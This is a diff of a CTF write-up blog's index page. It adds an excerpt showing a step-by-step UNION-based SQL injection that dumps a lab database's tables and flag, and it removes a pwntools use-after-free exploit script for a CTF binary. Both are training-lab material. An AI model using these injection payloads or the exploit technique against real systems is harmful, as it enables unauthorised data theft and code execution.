@@ -131,6 +131,35 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/05/SWPUCTF2021-ezsql-wp/" >SWPUCTF2021-ezsql-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-05
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/387">题目链接</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&gt; ?wllm=1<span class="string">&#x27;	# 尝试看看是否为sql查询</span></span><br><span class="line"><span class="string">&lt; You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line 1</span><br><span class="line"><span class="comment"># 说明确实为MariaDB sql查询且存在注入漏洞</span></span><br><span class="line"></span><br><span class="line">&gt; ?wllm=1<span class="string">&#x27; order by 3--+</span></span><br><span class="line"><span class="string">&lt; Your Login name:xxx</span></span><br><span class="line"><span class="string">  Your Password:yyy		# 正常</span></span><br><span class="line"><span class="string">&gt; ?wllm=1&#x27;</span> order by 4--+</span><br><span class="line">&lt; Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span>	<span class="comment"># 异常</span></span><br><span class="line"><span class="comment"># 说明读取列数为3，接着联合查询</span></span><br><span class="line"></span><br><span class="line">&gt; ?wllm=1<span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string">&lt; Your Login name:xxx</span></span><br><span class="line"><span class="string">  Your Password:yyy		# 正常</span></span><br><span class="line"><span class="string">&gt; ?wllm=1&#x27;</span> union <span class="keyword">select</span> 1,2,3 <span class="built_in">limit</span> 1,1--+	<span class="comment"># 取第一行</span></span><br><span class="line">&lt; Your Login name:2</span><br><span class="line">  Your Password:3	<span class="comment"># 说明Loginname为第二字段 password为第三字段</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取database名</span></span><br><span class="line">&gt; ?wllm=1<span class="string">&#x27; union select 1,2,database() limit 1,1--+</span></span><br><span class="line"><span class="string">&lt; Your Login name:2</span></span><br><span class="line"><span class="string">  Your Password:test_db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取tables</span></span><br><span class="line"><span class="string">&gt; ?wllm=1&#x27;</span> union <span class="keyword">select</span> 1,2,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;test_db&#x27;</span> <span class="built_in">limit</span> 1,1--+</span><br><span class="line">&lt; Your Login name:2</span><br><span class="line">  Your Password:test_tb,<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取columns</span></span><br><span class="line">&gt; ?wllm=1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27; limit 1,1--+</span></span><br><span class="line"><span class="string">&lt; Your Login name:2</span></span><br><span class="line"><span class="string">  Your Password:id,flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取flag</span></span><br><span class="line"><span class="string">&gt; ?wllm=1&#x27;</span> union <span class="keyword">select</span> 1,2,flag from test_db.test_tb <span class="built_in">limit</span> 1,1--+</span><br><span class="line">&lt; Your Login name:2</span><br><span class="line">  Your Password:NSSCTF&#123;85fe17d6-6beb-479d-a957-c69fb83d8217&#125; </span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/2023/07/05/SWPUCTF2021-ezsql-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/03/php-weakcmp/" >php弱类型绕过</a>
 								</h3>
 							</div>
@@ -470,34 +499,6 @@ else show_source(__FILE__);
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/06/12/BJDCTF2020-girlfriend-wp/" >BJDCTF2020 girlfriend-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-06-12
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/12/BJDCTF2020-girlfriend-wp">相关资源</a></p>
-<h2 id="use-after-free"><a href="#use-after-free" class="headerlink" title="use after free"></a>use after free</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pty = process.PTY</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./girlfriend&quot;</span>, stdin=pty, stdout=pty)</span><br><span class="line"><span class="comment"># proc = remote(&quot;node2.anna.nssctf.cn&quot;, 28783)</span></span><br><span class="line">belf = ELF(<span class="string">&quot;./girlfriend&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/ctf/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size is :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;name is :&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlt</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shw</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b add_girlfriend</span></span><br><span class="line"><span class="string">    b del_girlfriend</span></span><br><span class="line"><span class="string">    hook-bins</span></span><br><span class="line"><span class="string">    memory watch 0x00000000006020A0 6 qword</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(proc, gdbscript=gscript)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0000000000400B9C</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(backdoor))    <span class="comment">#add时先分配 struc_ptr 再分配 name_ptr</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(backdoor))</span><br><span class="line">dlt(<span class="number">0</span>)      <span class="comment"># delete的时候先free  name_ptr 再free struc_ptr</span></span><br><span class="line">dlt(<span class="number">1</span>)      <span class="comment"># 所以name_ptr 先进入fastbin</span></span><br><span class="line"><span class="comment"># 两次delete结束后fastbin: </span></span><br><span class="line"><span class="comment"># [0x20] chunk3(struc_ptr) -&gt; chunk1(struc_ptr) -&gt; chunk2(name_ptr)</span></span><br><span class="line"><span class="comment"># [0x30] chunk4(name_ptr)</span></span><br><span class="line"><span class="comment"># 再次add, chunk1 会被当做 name_ptr</span></span><br><span class="line"><span class="comment"># 这样就可以复写它的 func_ptr, 再执行show，就执行了后门函数</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(backdoor))</span><br><span class="line">shw(<span class="number">0</span>)</span><br><span class="line">pi()</span><br></pre></td></tr></table></figure>
-	
-	</div>
-  <a type="button" href="/2023/06/12/BJDCTF2020-girlfriend-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -545,7 +546,7 @@ else show_source(__FILE__);
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/CVE/">CVE<span>4</span></a></li>
+			<li><a href="/categories/CVE/">CVE<span>5</span></a></li>
 		
 			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
@@ -570,48 +571,48 @@ else show_source(__FILE__);
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/stack/">stack<span>10</span></a></li>
+			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/md5/">md5<span>1</span></a></li>
+			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
 		
-			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
 		
-			<li><a href="/tags/vtable/">vtable<span>2</span></a></li>
+			<li><a href="/tags/decrypt/">decrypt<span>1</span></a></li>
 		
-			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+			<li><a href="/tags/sql/">sql<span>8</span></a></li>
 		
-			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
+			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
 		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>3</span></a></li>
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
 		
-			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
+			<li><a href="/tags/Backdoorctf/">Backdoorctf<span>1</span></a></li>
 		
-			<li><a href="/tags/伪协议/">伪协议<span>3</span></a></li>
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>13</span></a></li>
 		
-			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
+			<li><a href="/tags/stack-pivot/">stack pivot<span>3</span></a></li>
 		
-			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
-		
-			<li><a href="/tags/unserialize/">unserialize<span>9</span></a></li>
-		
-			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
-		
-			<li><a href="/tags/rce/">rce<span>16</span></a></li>
-		
-			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
+			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
 		
 			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
 		
-			<li><a href="/tags/heap-overflow/">heap_overflow<span>1</span></a></li>
+			<li><a href="/tags/afr/">afr<span>2</span></a></li>
 		
-			<li><a href="/tags/ret2libc/">ret2libc<span>2</span></a></li>
+			<li><a href="/tags/got/">got<span>3</span></a></li>
 		
-			<li><a href="/tags/flask-session/">flask session<span>3</span></a></li>
+			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
 		
-			<li><a href="/tags/upload/">upload<span>4</span></a></li>
+			<li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li>
+		
+			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
+		
+			<li><a href="/tags/无参函数构造rce/">无参函数构造rce<span>2</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>111</span></a></li>
+		   <li><a href="/tags">...<span>113</span></a></li>
 		 
 		</ul>
 	</div>
@@ -622,6 +623,10 @@ else show_source(__FILE__);
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/11/20/CVE-2018-1259复现/" ><i class="fa fa-file-o"></i>CVE-2018-1259复现</a>
+      </li>
     
       <li>
         <a href="/2023/11/10/swampctf2019-syscaller-wp/" ><i class="fa fa-file-o"></i>swampctf2019-syscaller-wp</a>
@@ -637,10 +642,6 @@ else show_source(__FILE__);
     
       <li>
         <a href="/2023/10/23/GDOUCTF2023-reverseClock-wp/" ><i class="fa fa-file-o"></i>GDOUCTF2023-反方向的钟-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/20/ssti/" ><i class="fa fa-file-o"></i>SSTI模板注入</a>
       </li>
     
   </ul>
